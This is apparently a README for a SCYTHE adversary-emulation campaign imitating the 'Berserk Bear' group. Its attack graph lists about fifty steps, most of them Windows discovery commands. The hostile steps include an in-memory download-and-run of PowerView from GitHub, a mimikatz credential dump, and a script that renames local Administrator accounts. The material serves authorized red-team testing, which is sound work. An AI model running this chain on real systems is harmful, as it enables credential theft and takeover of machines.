This threat is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-bersek-bear

To Emulate:

1. Download and import the threat in JSON format to your SCYTHE instance: https://github.com/scythe-io/community-threats/blob/master/BerserkBear/Threat_Thursday_-_Berserk_Bear_scythe_threat.json
2. Go to the Threat Catalog and select "Threat Thursday - Berserk Bear
3. Click "Create Campaign from Threat"
4. Name the Campaign
5. Parameters: Replace --cp helios.scythedemo.com:443 with your SCYTHE instance IP address or FQDN.
6. Launch the Campaign



 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step2["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir /s c:\ >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir /s c:\Documents and Settings >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir /s c:\Program Files\ >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %systemdrive%\Users\*.* >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.* >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %userprofile%\Desktop\*.* >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c tree /F >> %temp%\download </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c net share </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1135'>att&ck-technique:T1135</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c tasklist </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step11["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step12["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step13["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step16["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step18["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step19["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step20["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step21["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step22["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step23["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step24["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step25["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step26["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step27["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step28["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri .*\.sys$ </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step29["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step30["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load upsh </i> <br>"]
Step31["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Invoke-Command -ScriptBlock {IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1); Invoke-UserHunter -Stealth -Verbose} </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step32["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Invoke-Command -ScriptBlock {Get-NetTCPConnection} </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step33["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c systeminfo </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step34["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step35["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c ipconfig /all </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step36["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c netsh interface show </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step37["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c arp -a </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step38["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c nbtstat -n </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step39["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c net config </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step40["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load mimikatz </i> <br>"]
Step41["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load printscr </i> <br>"]
Step42["<b> module: printscr </b> <br><h4> parameters: </h4> <i> --window Desktop </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step43["<b> module: mimikatz </b> <br><h4> parameters: </h4> <i> --arglist sekurlsa::logonPasswords </i> <br>"]
Step44["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\berserk </i> <br>"]
Step45["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load file </i> <br>"]
Step46["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\berserk\target_file.xls --size 5MB --count 10 --random </i> <br>"]
Step47["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell Compress-Archive %USERPROFILE%\Desktop\berserk %USERPROFILE%\Desktop\berserk.zip </i> <br><a href='https://attack.mitre.org/techniques/T1560'>att&ck-technique:T1560</a><br>
"]
Step48["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG ADD HKEY_CURRENT_USER\Software\ExampleRegKey /v Example /d Example Data /f </i> <br>"]
Step49["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG QUERY HKEY_CURRENT_USER\Software\ExampleRegKey </i> <br>"]
Step50["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG DELETE HKEY_CURRENT_USER\Software\ExampleRegKey /f </i> <br>"]
Step51["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Invoke-Command -ScriptBlock {$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter name = Administrators | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like *Administrator*) {
        Rename-LocalUser -Name $member.Name -NewName HaHaHa_$x$y$z$w
        Write-Host Successfully Renamed Administrator Account on $hostname
        }
    }} </i> <br><a href='https://attack.mitre.org/tactics/TA0003'>att&ck-tactic:TA0003</a><br>
<a href='https://attack.mitre.org/techniques/T1098'>att&ck-technique:T1098</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
Step30 --> Step31
Step31 --> Step32
Step32 --> Step33
Step33 --> Step34
Step34 --> Step35
Step35 --> Step36
Step36 --> Step37
Step37 --> Step38
Step38 --> Step39
Step39 --> Step40
Step40 --> Step41
Step41 --> Step42
Step42 --> Step43
Step43 --> Step44
Step44 --> Step45
Step45 --> Step46
Step46 --> Step47
Step47 --> Step48
Step48 --> Step49
Step49 --> Step50
Step50 --> Step51
Step51 --> Step52
```
